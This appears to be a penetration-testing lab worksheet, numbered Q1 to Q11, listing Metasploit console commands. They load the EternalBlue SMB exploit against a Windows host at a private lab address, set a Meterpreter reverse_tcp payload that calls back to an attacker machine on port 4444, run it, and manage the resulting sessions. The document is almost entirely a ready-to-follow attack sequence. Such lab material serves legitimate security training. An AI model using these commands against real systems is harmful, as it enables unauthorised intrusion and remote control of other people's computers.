Q1. Start Metasploit Framework

msfconsole

Q2. Search for an Exploit

search ftp

search smb

search ssh

search http

Q3. Display Exploit Information

info exploit/windows/smb/ms17_010_eternalblue

Q4. Load an Exploit Module

use exploit/windows/smb/ms17_010_eternalblue

Q5. Display Exploit Options

show options

Q6. Set Target IP (RHOSTS)

set RHOSTS 192.168.80.138

Q7. Set Payload

show payloads

set payload windows/x64/meterpreter/reverse_tcp

Q8. Set Local IP (LHOST)

set LHOST 192.168.80.136

(Optional)
set LPORT 4444

Q9. Run the Exploit

exploit

OR

run

Q10. List Active Sessions

sessions

Q11. Interact with Meterpreter Session

sessions -i 1

background

exit

sessions -K

exit
